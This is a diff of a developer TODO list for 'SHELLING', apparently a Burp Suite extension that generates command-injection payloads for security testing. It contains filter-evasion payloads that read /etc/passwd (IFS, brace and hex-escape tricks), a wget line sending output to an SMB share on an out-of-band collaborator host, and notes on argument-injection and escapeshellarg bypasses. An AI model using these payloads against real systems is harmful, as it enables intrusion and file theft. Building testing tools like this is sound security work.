@@ -1,38 +1,65 @@
 SHELLING TODO
 --------------------------------
-Fuckups that should not have happened:
-	- fix the fucking false negatives	
+TODO for the current release (before pushing this to the store):
 
-Tune the output encoding of the default payload set
+- UNC!
 
-OS-specific improvements:	
+- test the tar thing, add known injections or remove them from the interface for now if none of them is implemented
+
+- finish the features and options already available in the GUI (arg injection)
+
+- check payload 8 base for false negatives and shit that does not make sense:
+
+- fix the shit that does not make any sense, like:
+173	{ping,25}&	200	false	false	220	false	false	
+174	{ping,25}|	200	false	false	220	false	false	
+175	{ping,25};	200	false	false	220	false	false	
+177	{ping,25}&::	200	false	false	220	false	false	
+??
+
+- Make sure the menu does not fuck up under lower resolutions (I am pretty sure it still does)
+
+- SHIP IT!
+
+TODO for the next release:
+- Documentation
+- Warn about the scope issue in the documentation!
+- quotes!!!
+- Some form of best effort payloads
+- payload number recalculation function for each config change, to update the "Save CNT payloads" tab title (so we'll know in advance how many payloads will be produced with the current confgiruation
+Also, we can compare the counter with the actual size to check for duplicates/skipped paylaods
+
+custom command syntax
+OS-specific improvements:
 	- nix: https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html#known-bypassesexploits
-	- nix: introduce terminal injection payloads (escape sequences) like this one https://www.exploit-db.com/exploits/33504/
 	- nix: Introduce this IFS=,;`cat<<<uname,-a` by https://twitter.com/MrHappiey
+	- nix: reiterate through  (thanks to https://twitter.com/omespino/status/1001484143426002944)
+	- nix: AND https://gtfobins.github.io/gtfobins/tar/ and the like (for known injections, there's plenty of them as it turns out - a manageable list with predefined values would be better
+IFS=,;`cat<<<cat,/etc/passwd`
+cat$IFS/etc/passwd
+cat${IFS}/etc/passwd
+cat</etc/passwd                 
+{cat,/etc/passwd} OR {ls,-las,/var} with args
+X=$'cat\x20/etc/passwd'&&$X
+
 	- nix: -exec, -e, -r and other argument injections for direct code execution are encouraged ;]
-	- nix: -o, -O and -out are also good outputfile candidates in nix, the problem is we don't have UNC support... or do we?
+	- nix: -o, -O and -out are also good outputfile candidates in nix, the problem is we don't have UNC support... or do we? what about URLs to other protocols, like scp:// and the like?
 		we have to figure out something like:
 		wget http://wp.pl -O smb://fdwi7155tpq9htil8kigfkgfh6nwbl.burpcollaborator.net/share/public/file.txt
 		
 	- nix: also, consider injections into sh expressions (?)
+	- nix + win envirables inspirations from CONFidence
+
 	- win: the windows argument injection pattern /c "command" I "figured out" after reading the recently released reference
 	- win: additional argument separators for windows: ;-_,=/ (find out compatible commands, as echo/type are fine, while ping fails)
 	- win: check that obfuscation trick from Daniel's presentation (and prolly do more research on the subject)
-	- win: how about detecting command/argument injections by using > as the param separator... and UNC \\<PAYLOAD_MARK.COLLAB\ as its argument? ;]
-		- how about /out or /o counterpart (arg injection) of this?
-		- I believe we can improve the efficiency we discover argument injections... because we don't do it at all, do we? xD
 
+
+
+- response-based analysis as an additional feedback channel (for Scanner) and argument injection
 
 Improve the payload set:
-	- profiles (make a very good-effort, but optimized, default payload list) - e.g. nospace to focus on no-space only
-	- check the paylaod set for incorrect payloads (ones that do not make sense -> will always fail)
+	- check the full paylaod set for incorrect payloads (ones that do not make sense -> will always fail)
+	- profiles (make a very good-effort, but optimized, default payload list) - 10-50 most effective payloads
 
-Give the user the ability to mute the debug output maybe (especially the collab session tracking algorithm)?
-
-Update the fucking documentation
-
-Make sure the thing is BappSec-friendly :P
-
-Make sure the menu does not fuck up under lower resolutions (I am pretty sure it still does)
-
-BTW: The worst thing about Burp Collaborator is the payload length; much better to have a private instance at a domain as short as possible. Also, for private use, the length of the domain identifier could be much shorter (in most cases one byte would do the trick).
+BTW: The worst thing about Burp Collaborator is the payload length; much better to have a private instance at a domain as short as possible. Also, for private use, the length of the domain identifier could be much shorter (in most cases even one byte would do the trick).
